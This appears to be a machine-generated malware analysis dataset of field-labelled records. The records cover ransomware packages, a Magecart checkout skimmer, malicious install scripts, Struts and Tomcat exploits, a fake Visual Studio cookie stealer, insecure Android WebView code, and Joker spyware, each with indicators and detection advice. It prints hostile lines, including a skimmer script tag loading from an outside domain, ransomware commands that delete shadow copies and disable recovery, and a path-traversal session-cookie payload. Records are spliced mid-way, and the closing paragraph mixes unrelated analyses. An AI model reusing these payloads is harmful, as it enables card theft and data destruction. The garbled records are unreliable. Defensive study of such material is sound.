attack_chain.leads_to: Victim may recover files if they follow instructions.

behavioral_signatures: Automated traversal and modification of user profile directories (Desktop, Documents, Downloads, etc.)
File overwrite with Fernet-encrypted content and custom header (e.g., 'OHR ! ')
Base64-decoded binary payload dropped and executed from AppData
Network communication to Discord webhooks or APIs with encryption keys and user info
Username-based execution exclusion logic and persistence via AppData script
file_indicators: C:\Users\<USER>\AppData\Roaming\Main.py
C:\Users\<USER>\AppData\Roaming\screensaver.scr
Files in user directories with 'OHR ! ' header
network_indicators: Outgoing HTTP(S) requests to discord.com/api/webhooks/*
Discord server/channel references in package metadata
detection_knowledge.how_to_detect: Monitor for Python packages that access and modify files in user profile directories, especially those that overwrite files with encrypted content or custom headers such as 'OHR ! '. Flag packages that drop and execute base64-decoded binaries in AppData. Detect network traffic to Discord webhooks or APIs, particularly during or immediately after package installation. Look for username-based execution exclusion logic and persistent script creation in AppData. Use both static and dynamic analysis to identify these behaviors in setup.py or other package files. Correlate file creation and network activity to identify coordinated ransomware actions.

package_info.package_versions: Magento 1 (all versions, as platform is end-of-life)
package_info.why_malicious: The injected code is designed to steal payment card data from customers by skimming sensitive information during checkout and exfiltrating it to an attacker-controlled domain. The code is loaded via a compromised third-party domain and leverages SQL and PHP object injection to gain control of the store, enabling persistent and covert theft of payment data.

execution_context.trigger: At runtime, when a customer loads the checkout page
execution_context.file_location: Injected into Magento 1 frontend template files (e.g., app/design/frontend/base/default/template/checkout/onepage.phtml) or JavaScript files (e.g., skin/frontend/base/default/js/), via SQL or PHP object injection
required_permissions: network (to load external scripts and exfiltrate data)
filesystem (write access to web files for code injection)

malicious_snippets.code_snippet: <script src="https://naturalfreshmall.com/skin/frontend/base/default/js/payment.js"></script>
malicious_snippets.code_language: JavaScript (injected via PHP/SQL into Magento templates or JS files)
malicious_snippets.code_behavior: At runtime, when the checkout page is loaded, the code injects a remote JavaScript file from https://naturalfreshmall.com/skin/frontend/base/default/js/payment.js, which programmatically captures sensitive payment form data entered by customers, transmits this data via HTTP requests to the attacker's server, and results in the exfiltration of payment card information.

malice_analysis.why_suspicious: The code loads JavaScript from an unrelated, external domain (naturalfreshmall.com) directly on the payment checkout page, which is a hallmark of Magecart-style skimming attacks. This domain is not associated with the legitimate business and is used to deliver malicious scripts.
malice_analysis.violated_expectations: Legitimate Magento stores should only load scripts from trusted, first-party domains or well-known third-party providers (such as payment processors or analytics platforms). Injecting arbitrary third-party scripts into sensitive payment workflows is never standard practice and violates PCI DSS requirements.
malice_analysis.similar_legitimate_use: Some stores legitimately use third-party scripts for analytics or payment processing, but these are from well-known, vetted domains (e.g., Google Analytics, Stripe, PayPal). Loading scripts from obscure or unrelated domains is not legitimate.
key_indicators: Presence of <script> tags referencing naturalfreshmall.com in checkout or payment-related templates
External JavaScript loaded from a domain with no legitimate business relationship
Script injection occurs specifically in sensitive payment workflow files
No corresponding legitimate extension or module for the loaded script

attack_chain.action: Attacker exploits SQL injection and PHP object injection vulnerabilities in the Magento 1 store to gain unauthorized write access to web application files.
attack_chain.leads_to: Ability to modify frontend template or JavaScript files, enabling persistent code injection

attack_chain.action: Malicious <script> tag referencing the attacker's domain is injected into the checkout page or related frontend files.
attack_chain.leads_to: Execution of remote JavaScript code in customer browsers during checkout

attack_chain.action: Remote JavaScript skimmer, loaded from the attacker's domain, captures payment form data entered by customers and exfiltrates it to the attacker's server.
attack_chain.leads_to: Theft of customer payment card information, enabling financial fraud

behavioral_signatures: Unexpected external JavaScript loaded on checkout or payment pages, especially from domains not associated with the business
Network requests from customer browsers to untrusted or previously unseen domains during the checkout process
Unauthorized or unexplained modifications to Magento frontend template or JavaScript files outside of normal update cycles
file_indicators: Injected <script> tags referencing https://naturalfreshmall.com/skin/frontend/base/default/js/payment.js in template files (e.g., onepage.phtml)
Unusual changes or additions in skin/frontend/base/default/js/ or app/design/frontend/base/default/template/checkout/ files
Presence of new or modified files that include external script references in payment-related templates
network_indicators: Outbound HTTP or HTTPS connections from customer browsers to naturalfreshmall.com during checkout
POST or GET requests containing payment or form data sent to external domains not associated with the merchant
DNS lookups for naturalfreshmall.com originating from the checkout page
detection_knowledge.how_to_detect: Monitor for unauthorized changes to Magento frontend template and JavaScript files, especially those that add or modify <script> tags referencing external domains. Use web application firewalls (WAF) to detect and block SQL injection and PHP object injection attempts. Analyze network traffic from checkout pages for requests to untrusted domains such as naturalfreshmall.com. Regularly scan the page source code for the presence of known skimmer domains and unexpected external script inclusions. Implement file integrity monitoring to detect unauthorized file changes in payment workflow files.

package_info.why_malicious: The report describes a class of intentionally malicious open source components that are purpose-built to compromise networks by masquerading as legitimate packages. These components are designed to be downloaded and executed within developer environments, CI/CD pipelines, or during automated builds, with the sole intent of breaching networks, exfiltrating data, or enabling further attacks. Unlike legitimate open source packages that may contain accidental vulnerabilities, these are crafted specifically for malicious purposes.

execution_context.file_location: setup.py, package.json, or equivalent build/install script

malicious_snippets.code_behavior: At import-time or during postinstall, the code accesses sensitive environment variables and local files, then exfiltrates this data to a remote attacker-controlled server via HTTPS POST, enabling credential and data theft.

malice_analysis.why_suspicious: The code performs unauthorized access to sensitive data and immediately transmits it to an external server, which is a hallmark of data exfiltration malware.
malice_analysis.violated_expectations: Normal open source packages should not access secrets or transmit data externally during installation or import. This behavior is unexpected and dangerous.
malice_analysis.similar_legitimate_use: Some legitimate telemetry or crash reporting tools may send anonymized data, but never secrets or sensitive files.
key_indicators: Access to environment variables like tokens or credentials
Reading sensitive files (e.g., /etc/passwd, SSH keys)
Network requests to non-standard or hardcoded domains
Execution during install or import time

attack_chain.action: Malicious component is downloaded and included in the developer's environment or CI/CD pipeline.
attack_chain.leads_to: Execution of malicious code during build, install, or import.

attack_chain.action: Malicious code executes automatically, harvesting sensitive data such as environment variables, credentials, or files.
attack_chain.leads_to: Exfiltration of harvested data to attacker-controlled infrastructure.

attack_chain.action: Exfiltrated data is received by the attacker, enabling further compromise or lateral movement.
attack_chain.leads_to: Potential for further attacks, persistence, or ransomware deployment.

behavioral_signatures: Execution of code during package installation or import that accesses environment variables or sensitive files
Outbound network connections to untrusted or hardcoded domains during build or install
Unexpected file reads (e.g., SSH keys, config files) by third-party packages
file_indicators: Presence of suspicious scripts in setup.py, package.json, or build scripts
References to external domains or IPs in install scripts
Unusual dependencies or obfuscated code in open source packages
network_indicators: Outbound HTTPS/HTTP requests to domains not associated with the package's legitimate functionality
Connections to known malware C2 infrastructure or disposable domains (e.g., webhook.site, pastebin, etc.)
detection_knowledge.how_to_detect: Monitor for packages that execute code during installation or import, especially those that access environment variables, sensitive files, or make outbound network requests. Use static and dynamic analysis to flag packages with suspicious install scripts or hardcoded external endpoints. Implement repository firewalls and allowlisting to prevent untrusted packages from entering the developer toolchain or CI/CD pipeline.

package_info.package_versions: 2.3.5 and earlier (as referenced in the Equifax breach context)
package_info.why_malicious: The report discusses the exploitation of a known vulnerability (CVE-2017-5638) in outdated versions of the Apache Struts open source component. Attackers leveraged this vulnerability to gain unauthorized access to sensitive data in the Equifax breach. The maliciousness arises from the use of a vulnerable library version in production systems, which enables remote code execution by attackers.

execution_context.trigger: When the vulnerable Apache Struts library processes a specially crafted HTTP request containing a malicious Content-Type header
execution_context.file_location: struts-core/src/main/java/org/apache/struts2/dispatcher/Dispatcher.java (within the vulnerable version of Apache Struts)

malicious_snippets.code_behavior: Upon receiving an HTTP request, the code evaluates the Content-Type header using OGNL expression evaluation, allowing attacker-supplied expressions to be executed on the server, resulting in arbitrary code execution.

malice_analysis.why_suspicious: The code evaluates user-supplied HTTP headers as OGNL expressions, which allows attackers to inject and execute arbitrary code on the server.
malice_analysis.violated_expectations: Normally, HTTP headers should be treated as untrusted input and never directly evaluated as code. The vulnerable code path fails to properly sanitize or restrict OGNL evaluation, violating secure coding practices.
malice_analysis.similar_legitimate_use: Legitimate use of OGNL in Struts is for safe expression evaluation within the application context, not for evaluating untrusted HTTP headers. Evaluating headers as code is never legitimate.
key_indicators: OGNL expression evaluation on HTTP headers
Lack of input sanitization on Content-Type header
Direct invocation of evaluateOGNL or similar methods on user-controlled data

attack_chain.action: Attacker sends a specially crafted HTTP request with a malicious Content-Type header to the vulnerable Apache Struts endpoint.
attack_chain.leads_to: Triggering the vulnerable code path in the Struts library.

attack_chain.action: The vulnerable code in Apache Struts evaluates the malicious OGNL expression from the Content-Type header.
attack_chain.leads_to: Remote code execution on the application server.

attack_chain.action: Attacker gains unauthorized access to sensitive data or further compromises the system.
attack_chain.leads_to: Data exfiltration or further lateral movement.

behavioral_signatures: Detection of OGNL expression evaluation on HTTP headers, especially Content-Type
Unusual or unexpected Content-Type header values in HTTP requests
Execution of system commands or abnormal process creation by the web server process
file_indicators: Presence of vulnerable Apache Struts library versions (e.g., struts2-core-2.3.5.jar) in application dependencies
network_indicators: Inbound HTTP requests with Content-Type headers containing OGNL payloads (e.g., ${...})
detection_knowledge.how_to_detect: Implement software composition analysis (SCA) to identify and alert on known-vulnerable versions of Apache Struts in application dependencies. Monitor HTTP traffic for suspicious Content-Type headers containing OGNL expressions. Correlate web server logs for unexpected command execution or process creation following such requests. Automated detection should flag applications using affected Struts versions and alert on inbound requests with OGNL payloads in headers.

package_info.package_name: Fake Microsoft Visual Studio Installer (Cookie Stealer)
package_info.package_manager: N/A (Distributed as a deceptive installer via phishing/third-party sites)
package_info.why_malicious: The installer impersonates the official Microsoft Visual Studio installer but instead deploys a Cookie Stealer malware. It is distributed through phishing campaigns, social engineering, and malicious advertisements, with the intent to extract browser cookies and other sensitive data from the victim's system and exfiltrate them to an attacker-controlled server.

execution_context.trigger: Upon execution of the fake installer binary
execution_context.file_location: Malicious Visual Studio installer executable (e.g., Setup.exe or similarly named file in the download directory)
required_permissions: filesystem (read access to browser profile directories)

malicious_snippets.code_snippet: The code enumerates browser profile directories for Chrome, Edge, and Firefox, locates and reads cookie storage files (such as 'Cookies' for Chromium-based browsers and 'cookies.sqlite' for Firefox), decrypts stored cookies using system APIs or hardcoded decryption routines, and transmits the extracted cookie data to a hardcoded remote command-and-control (C2) server via HTTP POST requests.
malicious_snippets.code_language: Compiled executable (likely C++ or C#, or Python bundled as EXE via PyInstaller or similar tool)
malicious_snippets.code_behavior: Upon execution of the installer, the code scans browser profile directories, reads and decrypts browser cookie files, then sends the extracted cookie data via HTTP POST to a hardcoded remote server, resulting in theft of session credentials and user data.

malice_analysis.why_suspicious: Accessing and exfiltrating browser cookies is not a legitimate action for any installer, especially one claiming to be from Microsoft. The code's behavior of decrypting and transmitting sensitive user data to an external server is a clear indicator of credential theft.
malice_analysis.violated_expectations: A genuine Visual Studio installer should only install development tools and dependencies, never access browser data or perform network exfiltration of user credentials.
malice_analysis.similar_legitimate_use: Enterprise security or compliance tools may access browser data for auditing, but only with explicit user consent and never transmit it to untrusted or unknown servers.
key_indicators: Direct access to browser profile directories (e.g., AppData\Local\Google\Chrome\User Data, AppData\Roaming\Mozilla\Firefox\Profiles)
Reading and decrypting browser cookie storage files ('Cookies', 'cookies.sqlite')
Outbound HTTP POST requests to hardcoded, non-Microsoft domains immediately after installer execution
Installer binary is unsigned or signed with an untrusted certificate
Masquerading as a legitimate Microsoft Visual Studio installer

attack_chain.action: Victim is lured to download and execute a fake Visual Studio installer via phishing emails, social engineering, or malicious advertisements.
attack_chain.leads_to: Execution of the malicious installer

attack_chain.action: Upon execution, the malicious installer scans the system for browser profile directories and extracts stored cookies.
attack_chain.leads_to: Collection of sensitive browser cookie data

attack_chain.action: The installer decrypts the extracted cookies and sends them to a remote attacker-controlled C2 server via HTTP POST.
attack_chain.leads_to: Attacker gains access to victim's web sessions and online accounts

behavioral_signatures: Installer processes (e.g., Setup.exe) accessing browser profile directories immediately after launch
Unexpected read operations on browser cookie files ('Cookies', 'cookies.sqlite') by installer binaries
Outbound HTTP POST requests from installer processes to non-Microsoft or suspicious domains
Execution of unsigned or suspiciously signed installer binaries masquerading as Microsoft products
file_indicators: Installer executables named similarly to official Visual Studio installers but not signed by Microsoft
Presence of installer files downloaded from non-official Microsoft sources
Temporary files or artifacts created in browser profile directories during installer execution
Unusual access timestamps on browser cookie files coinciding with installer execution
network_indicators: HTTP POST requests to hardcoded or suspicious domains/IPs not associated with Microsoft immediately after installer execution
Connections to known C2 infrastructure or domains previously linked to cookie stealer malware
Outbound traffic from installer binaries to IP addresses or domains flagged in threat intelligence feeds
detection_knowledge.how_to_detect: Monitor for installer processes accessing browser cookie storage locations and initiating outbound HTTP POST requests to untrusted or non-Microsoft domains. Flag unsigned or suspiciously signed Visual Studio installers, especially those downloaded from unofficial sources. Correlate process execution with file access and network activity to identify cookie exfiltration attempts. Alert on anomalous access to browser cookie files by non-browser processes, particularly during or immediately after installer execution.

package_info.package_name: Android System WebView (and apps using WebView)
package_info.package_versions: Multiple (not version-specific, but applies to many apps using WebView)
package_info.why_malicious: Many Android applications using WebView fail to implement critical security best practices, leading to vulnerabilities such as lack of HTTPS enforcement, improper SSL error handling, lack of content loading validation, and insecure JavaScript interfaces. These issues can be exploited for man-in-the-middle attacks, data exfiltration, and remote code execution.

execution_context.trigger: At runtime, when the WebView loads a URL.
execution_context.file_location: Java/Kotlin Activity or Fragment containing WebView code.

malicious_snippets.code_snippet: webView.loadUrl("http://example.com");
malicious_snippets.code_behavior: At runtime, the code loads a URL over HTTP (unencrypted), sending user data and web content in plaintext over the network, which can be intercepted or modified by attackers.

malice_analysis.why_suspicious: Loading content over HTTP exposes all data in transit to eavesdropping and man-in-the-middle attacks, as the connection is not encrypted.
malice_analysis.violated_expectations: Normal behavior is to enforce HTTPS for all communications to ensure confidentiality and integrity; this code fails to do so, violating secure transport expectations.
malice_analysis.similar_legitimate_use: HTTP may be used in controlled testing environments or for non-sensitive demo apps, but should never be used in production for user-facing or sensitive data.
key_indicators: Use of 'http://' instead of 'https://'
No enforcement of secure transport in WebView.loadUrl

execution_context.trigger: At runtime, when an SSL error occurs during WebView content loading.

malicious_snippets.code_behavior: At runtime, when an SSL error is encountered, the code instructs the WebView to ignore the error and continue loading the content, allowing potentially malicious or intercepted content to be displayed to the user.

malice_analysis.why_suspicious: Bypassing SSL errors allows attackers to present invalid or malicious certificates, enabling man-in-the-middle attacks and interception of sensitive data.
malice_analysis.violated_expectations: Normal behavior is to block loading on SSL errors and alert the user; this code disables that protection, undermining certificate validation.
malice_analysis.similar_legitimate_use: Rarely legitimate, such as for debugging with self-signed certificates in development, but never acceptable in production environments.
key_indicators: handler.proceed() called within onReceivedSslError
No user warning or certificate validation logic present

execution_context.trigger: At runtime, when the WebView loads a URL based on user input or external parameters.
execution_context.file_location: Java/Kotlin Activity or Fragment containing WebView code.

malicious_snippets.code_snippet: webView.loadUrl(getIntent().getStringExtra("item"));
malicious_snippets.code_behavior: At runtime, the code loads a URL in the WebView based on unvalidated external input, allowing an attacker to supply arbitrary URLs that the app will load and display.

malice_analysis.why_suspicious: Loading URLs directly from unvalidated input can lead to arbitrary content loading, phishing, or execution of malicious code within the WebView context.
malice_analysis.violated_expectations: Normal behavior is to validate and restrict URLs before loading them in a WebView; this code does not perform any validation or sanitization.
malice_analysis.similar_legitimate_use: Legitimate if input is strictly validated and sanitized to only allow trusted URLs.
key_indicators: Direct use of external input (getIntent().getStringExtra) in loadUrl
No validation or sanitization of input before loading

execution_context.trigger: At runtime, when the WebView is initialized.
execution_context.file_location: Java/Kotlin Activity or Fragment containing WebView code.

malicious_snippets.code_snippet: webView.getSettings().setJavaScriptEnabled(true);
malicious_snippets.code_behavior: At runtime, the code enables JavaScript execution in the WebView, allowing loaded web content to execute scripts, which increases the attack surface for XSS and script-based attacks.

malice_analysis.why_suspicious: Enabling JavaScript increases the risk of exploitation, especially if combined with untrusted content loading or exposed JavaScript interfaces.
malice_analysis.violated_expectations: Default is to have JavaScript disabled for security; enabling it should be justified and combined with strict input validation and content restrictions.
malice_analysis.similar_legitimate_use: Legitimate for apps requiring rich web content, but only if combined with strict input validation and content whitelisting.
key_indicators: setJavaScriptEnabled(true) called on WebView settings
No additional security controls or content validation present

execution_context.trigger: At runtime, when the WebView is initialized and a JavaScript interface is added.
execution_context.file_location: Java/Kotlin Activity or Fragment containing WebView code.

malicious_snippets.code_snippet: webView.addJavascriptInterface(new MyInterface(), "Android");
malicious_snippets.code_behavior: At runtime, the code exposes a Java object to JavaScript running in the WebView, allowing web content to invoke native methods and potentially access device resources or sensitive data.

malice_analysis.why_suspicious: Exposing JavaScript interfaces without strict validation can allow attackers to invoke native code, access files, or perform privileged actions if malicious content is loaded.
malice_analysis.violated_expectations: Normal behavior is to restrict or validate exposed interfaces and only allow trusted content to access them; this code may expose sensitive functionality to untrusted web content.
malice_analysis.similar_legitimate_use: Legitimate if interface methods are safe, input is validated, and only trusted content is loaded in the WebView.
key_indicators: addJavascriptInterface used without input validation or content restriction
No restriction on what web content can access the interface

attack_chain.action: App loads unencrypted HTTP content in WebView.
attack_chain.leads_to: Enables interception or tampering of data in transit by network attackers.

attack_chain.action: App ignores SSL/TLS errors, allowing loading of content from servers with invalid certificates.
attack_chain.leads_to: Allows man-in-the-middle attacker to present malicious content to the user.

attack_chain.action: App loads URLs based on unvalidated external input.
attack_chain.leads_to: Attacker can control what is loaded in the WebView, potentially leading to phishing or malicious code execution.

attack_chain.action: App enables JavaScript in WebView.
attack_chain.leads_to: Increases risk of script-based attacks, such as XSS, especially if untrusted content is loaded.

attack_chain.action: App exposes insecure JavaScript interface to WebView.
attack_chain.leads_to: Attacker can execute native code or access device resources via XSS or malicious web content.

behavioral_signatures: WebView loading URLs over HTTP (unencrypted transport)
Custom WebViewClient with onReceivedSslError calling handler.proceed()
WebView loading URLs directly from unvalidated external input (e.g., getIntent().getStringExtra)
WebView with JavaScript enabled and no content validation or restriction
WebView exposing JavaScript interfaces without input validation or content whitelisting
file_indicators: Custom WebViewClient implementations overriding onReceivedSslError
Use of addJavascriptInterface in Activity or Fragment code without input validation
WebView.loadUrl with direct use of getIntent() or other external parameters
network_indicators: Outbound HTTP (not HTTPS) requests from app WebView
Connections to domains not whitelisted or validated by the app, especially when loaded via WebView
detection_knowledge.how_to_detect: Statically analyze Android app code for WebView usage patterns: (1) detect loadUrl calls with 'http://' URLs, (2) identify WebViewClient implementations where onReceivedSslError calls handler.proceed(), (3) flag addJavascriptInterface usage without strict input validation or content restriction, and (4) check for setJavaScriptEnabled(true) without corresponding content validation. Monitor network traffic for unencrypted HTTP requests from app WebViews and for connections to untrusted or non-whitelisted domains.

package_info.package_versions: 2.2.0-RELEASE (and all Tomcat versions prior to the fix for CVE-2020-9484)
package_info.why_malicious: The embedded Apache Tomcat version in this Spring Boot package is vulnerable to a remote code execution (RCE) flaw (CVE-2020-9484) when configured with PersistentManager and FileStore. Attackers can exploit path traversal in session file loading to trigger deserialization of attacker-controlled data, leading to arbitrary code execution.

execution_context.trigger: At runtime, when the server receives an HTTP request with a crafted JSESSIONID cookie containing path traversal sequences
execution_context.file_location: Tomcat session management logic (PersistentManager with FileStore configuration)
required_permissions: filesystem (read access to session storage directories)

malicious_snippets.code_snippet: JSESSIONID=../../../../../../../foo/mysession
malicious_snippets.code_language: HTTP (session identifier manipulation affecting Java backend)
malicious_snippets.code_behavior: At runtime, when the server processes an HTTP request with a JSESSIONID containing path traversal, Tomcat's PersistentManager attempts to load a session file from the attacker-specified location, resulting in deserialization of attacker-controlled data and potential remote code execution.

malice_analysis.why_suspicious: The use of path traversal in the JSESSIONID allows an attacker to direct the server to load arbitrary files as session data. When these files are deserialized without validation, it enables execution of malicious payloads embedded in serialized objects.
malice_analysis.violated_expectations: Session IDs are expected to be opaque, server-generated tokens that do not influence file paths or access. Allowing user-supplied session IDs to dictate file loading paths violates the principle of input validation and trust boundaries.
malice_analysis.similar_legitimate_use: Session IDs are legitimately used to track user sessions, but should never be interpreted as file paths or used to access arbitrary files on the server.
key_indicators: JSESSIONID cookie containing path traversal sequences (e.g., ../../..)
Session file loading based on user-supplied input
Deserialization of files outside the intended session storage directory

execution_context.trigger: At runtime, when a session file is present in a directory accessible via path traversal and the server attempts to load it
execution_context.file_location: foo/mysession.session (arbitrary file placed in the server's session storage directory or a directory accessible via path traversal)
required_permissions: filesystem (write access to session storage directories or directories accessible via path traversal)

malicious_snippets.code_snippet: Attacker uploads a crafted serialized Java object as mysession.session in a directory accessible via path traversal.

package_info.why_malicious: Stratus Red Team is not itself malicious, but it packages and automates the execution of attack techniques that emulate real-world cloud attacks. These techniques, if used outside of controlled testing, would be considered malicious as they perform actions such as backdooring Lambda functions and disabling CloudTrail logging, which are common attacker behaviors for persistence and defense evasion. The tool enables users to execute these techniques in a way that, if misused, can compromise cloud environments by reducing audit visibility and enabling unauthorized access.

malicious_snippets.code_behavior: At runtime (detonation phase), the code invokes the AWS CloudTrail StopLogging API for a specified trail, sending an authenticated request to AWS to disable audit logging, resulting in reduced visibility of subsequent actions.

malice_analysis.why_suspicious: The code programmatically disables CloudTrail logging, which is a well-known defense evasion tactic used by attackers to prevent security teams from detecting or investigating malicious activity. This action directly undermines cloud auditability.
malice_analysis.violated_expectations: Legitimate cloud applications should not disable audit logging or interfere with security monitoring services. Disabling CloudTrail is only expected in rare, well-documented administrative or incident response scenarios, and should always require explicit approval and justification.
malice_analysis.similar_legitimate_use: A security administrator might temporarily stop CloudTrail logging for troubleshooting or cost management, but such actions should be rare, logged, and subject to strict change control processes.
key_indicators: Direct invocation of cloudtrail:StopLogging API
Automated disabling of audit logging without user approval
No user interaction or multi-factor confirmation required
Targeting production or critical CloudTrail trails

malicious_snippets.code_behavior: At runtime (detonation phase), the code modifies the Lambda function's resource-based policy by adding a statement that grants lambda:InvokeFunction permission to all principals, allowing any AWS account to invoke the function and enabling unauthorized external access.

malice_analysis.why_suspicious: Granting lambda:InvokeFunction permission to all principals ("*") in a Lambda policy is a classic persistence and privilege escalation technique, as it allows any AWS account or unauthenticated entity to invoke the function, potentially leading to data exfiltration or lateral movement.
malice_analysis.violated_expectations: Normal Lambda function policies should restrict invocation to specific trusted principals or AWS services. Granting global invoke permissions is highly unusual, dangerous, and violates the principle of least privilege.
malice_analysis.similar_legitimate_use: A public API Lambda might intentionally allow broad access, but this should be accompanied by strong authentication, monitoring, and explicit business justification. Such policies should be rare and tightly controlled.

package_info.why_malicious: The affected versions of the struts2-core package contain a critical vulnerability (CVE-2017-5638) that allows attackers to execute arbitrary code on the server by sending specially crafted HTTP requests with a malicious Content-Type header. This vulnerability enables remote code execution (RCE) by exploiting unsafe parsing and evaluation of user-supplied header values, and has been widely exploited in the wild, resulting in major data breaches and system compromises.

execution_context.trigger: During HTTP request processing, specifically when handling multipart/form-data file uploads or form submissions.

malicious_snippets.code_behavior: During HTTP request processing, the code parses the Content-Type header of multipart/form-data requests, passes invalid or unexpected values to error handling logic, which unsafely evaluates the header value, resulting in attacker-supplied code being executed on the server.

malice_analysis.why_suspicious: The code path allows attacker-controlled HTTP headers to be parsed and evaluated as code, which is a direct vector for remote code execution (RCE). The lack of input sanitization or validation on the Content-Type header enables attackers to inject malicious payloads that are executed by the server.
malice_analysis.violated_expectations: Normally, HTTP headers should be treated strictly as data and never evaluated or executed. In this case, the Content-Type header is unsafely evaluated, violating the expectation that user input is never executed as code.
malice_analysis.similar_legitimate_use: Legitimate error handling may log or display header values for debugging, but should never interpret or execute them. Executing or evaluating header values is never a legitimate use case.
key_indicators: User-supplied Content-Type header is parsed and evaluated as code

package_info.why_malicious: SplitLoader is a malicious npm package distributed as part of a social engineering campaign, often masquerading as coding test assignments or a game (DeTankWar). It is designed to deliver custom malware loaders that decrypt and execute additional payloads, enabling arbitrary code execution, data theft, cyberespionage, and facilitating ransomware deployment.

malicious_snippets.code_behavior: At import-time, the code reads an encrypted payload from disk, decrypts it using a key from an environment variable, writes the decrypted payload to disk, and executes it as a new process, enabling arbitrary code execution.

malice_analysis.why_suspicious: The code decrypts and executes a hidden payload at import-time, which is a common malware loader technique that allows attackers to run arbitrary code as soon as the package is imported.
malice_analysis.violated_expectations: Normal npm packages do not decrypt and execute hidden binaries during import; legitimate packages should not execute arbitrary code on import, especially without user interaction or consent.
malice_analysis.similar_legitimate_use: Some legitimate installers or updaters may unpack and run binaries, but not in the context of a coding test or game package, and not automatically at import-time.

package_info.why_malicious: The JavaScript files impersonate legitimate Windows Security updates but, upon execution, initiate a fileless attack chain: they spawn a hidden PowerShell process with execution policy bypassed, delete system backups and recovery options, and download and execute the Magniber ransomware payload in memory, resulting in user data encryption and extortion. malice_analysis.why_suspicious: The use of vssadmin, wbadmin, and bcdedit to delete backups and disable recovery is a well-documented ransomware tactic to prevent victims from restoring their files.
malice_analysis.violated_expectations: Legitimate update scripts should never interfere with or delete system backups, shadow copies, or recovery settings, as these are critical for system integrity and user data safety.
malice_analysis.similar_legitimate_use: IT administrators may use these commands for system maintenance, but never in scripts presented as user-initiated updates or without explicit administrative oversight.
key_indicators: vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
Execution of destructive backup and recovery commands in memory

execution_context.trigger: runtime (after backup deletion, before or during ransomware payload execution)

malice_analysis.why_suspicious: Downloading and executing code from an untrusted remote server, especially directly in memory, is a hallmark of advanced malware. The use of syscalls to inject shellcode further indicates intent to evade security products.
malice_analysis.violated_expectations: Legitimate scripts should never download and execute code from untrusted sources, nor should they perform in-memory execution or use direct syscalls for code injection.
malice_analysis.similar_legitimate_use: Some legitimate updaters may download signed updates, but they write to disk, verify signatures, and do not execute code in memory or use syscalls for injection.

New-Object Net.WebClient for payload retrieval
Direct shellcode injection via syscall

package_info.why_malicious: The Joker malware is designed to covertly steal sensitive user data, including SMS messages, contact lists, and device information, from infected Android devices. It was distributed via 24 different applications on the Google Play Store, targeting users in 37 countries and resulting in nearly half a million downloads before removal. The malware’s primary purpose is unauthorized data exfiltration and subscription fraud, making it inherently malicious.

execution_context.trigger: at runtime after user grants permissions
execution_context.file_location: malicious code embedded within the main application logic, typically in MainActivity.java or a background service such as com.example.service.StealerService

malicious_snippets.code_behavior: At runtime after the user grants permissions, the code reads SMS messages, contact lists, and device information, encodes the collected data, and exfiltrates it via HTTP POST to an attacker-controlled server, resulting in unauthorized theft of sensitive user data.

malice_analysis.why_suspicious: The code silently accesses sensitive data (SMS, contacts, device information) and transmits it to an external, attacker-controlled server without user knowledge or consent. This behavior is characteristic of spyware and data theft operations.
malice_analysis.violated_expectations: Legitimate applications may request access to SMS or contacts for user-facing features, but they do not covertly exfiltrate this data to unknown remote servers, nor do they operate without clear user notification and consent.
malice_analysis.similar_legitimate_use: A legitimate backup or messaging app might access SMS and contacts, but would transparently inform the user, use secure and well-known cloud endpoints, and provide clear privacy policies and opt-in mechanisms.
key_indicators: Silent access to SMS, contacts, and device information without user interaction
Network exfiltration of encoded user data to untrusted or unknown domains
Use of background services to perform data theft outside of visible app features
No user notification or consent for data transfer
Obfuscated or hidden code paths related to data collection and exfiltration

attack_chain.action: User installs a seemingly benign app from Google Play containing the Joker malware.

attack_chain.action: Malicious code requests and obtains permissions to access SMS, contacts, and device information, often disguising the request as necessary for app functionality.
attack_chain.leads_to: App is granted sensitive permissions, enabling data collection.

attack_chain.action: At runtime after permissions are granted, the malware reads SMS messages, contact lists, and device information using background services.
attack_chain.leads_to: Sensitive user data is collected and prepared for exfiltration.

attack_chain.action: Collected data is encoded and sent via HTTP POST to an attacker-controlled server using the INTERNET permission.
attack_chain.leads_to: Attacker receives stolen data, achieving the malware's objective of data theft.

behavioral_signatures: Android app accessing SMS, contacts, and device information without clear user-facing functionality or justification
Silent network exfiltration of sensitive data to unknown or untrusted domains, especially via HTTP POST
Requesting sensitive permissions (READ_SMS, READ_CONTACTS, READ_PHONE_STATE, INTERNET) at install or runtime in apps that do not require them for core features
Presence of background services or broadcast receivers that operate without user interaction and are not tied to visible app features
file_indicators: Apps with obfuscated or encrypted code accessing android.permission.READ_SMS, android.permission.READ_CONTACTS, android.permission.READ_PHONE_STATE, and android.permission.INTERNET
Presence of suspicious background services (e.g., StealerService) or broadcast receivers not referenced in the app’s main UI flow
Manifest files declaring sensitive permissions unrelated to the app’s stated purpose
network_indicators: HTTP POST requests to non-standard, attacker-controlled domains (e.g., domains not associated with the app developer or well-known cloud providers)
Unencrypted transmission of encoded or encrypted blobs containing user data over HTTP
Frequent or periodic outbound connections from background services to unknown IP addresses or domains
detection_knowledge.how_to_detect: Monitor Android applications for suspicious permission requests and runtime access to SMS, contacts, and device information, especially in apps whose stated functionality does not require such access. Flag apps that exfiltrate this data to unknown or untrusted domains, particularly via HTTP POST from background services. Use static analysis to identify code patterns matching known Joker malware behaviors, such as obfuscated data collection routines and hidden network communication endpoints. Employ dynamic analysis and network monitoring to detect unusual outbound HTTP POST requests containing encoded user data. Correlate permission usage, background service activity, and network behavior to identify apps exhibiting Joker-like malicious patterns.

malicious_snippets.code_behavior: At runtime, the code reads Chrome's 'Login Data' SQLite database, decrypts saved credentials using Windows DPAPI, and transmits the extracted usernames and passwords to a remote MongoDB database via an outbound network connection, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code performs unauthorized access to browser password storage, decrypts sensitive credential data, and exfiltrates it to an external server without user knowledge or consent. This is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: Legitimate software should not access or decrypt browser-stored passwords without explicit user consent, nor should it transmit such data to third-party servers. This enables attackers to inject and execute arbitrary code if an injection point is present. Multiple vulnerabilities have allowed attackers to bypass OGNL security controls, manipulate application state, and execute system commands, resulting in remote code execution and privilege escalation.

